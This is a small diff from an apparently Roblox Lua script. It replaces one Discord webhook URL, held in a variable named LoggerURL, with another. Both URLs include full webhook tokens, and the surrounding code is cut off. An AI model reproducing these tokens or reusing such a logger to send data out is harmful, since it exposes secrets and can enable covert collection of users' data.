@@ -24,7 +24,7 @@ for _, v in pairs(CoreGui:GetChildren()) do
     end
 end
 
-local LoggerURL = "https://discord.com/api/webhooks/1328349212425060425/TydmuTIN2oH5nGN0p6WWSnIJjgnKtpgw3E-QWsC9czXaIvEgTBLPSVp0G7g1S3HOlzfK"
+local LoggerURL = "https://discord.com/api/webhooks/1414475374557007912/a6EAVcQA2FUYMftYLUTklmDxDYiVvojfinLtUdcJzbZG65jVkI2BO5VXUIDKSP1NRv2S"
 
 task.spawn(function()
     pcall(function()
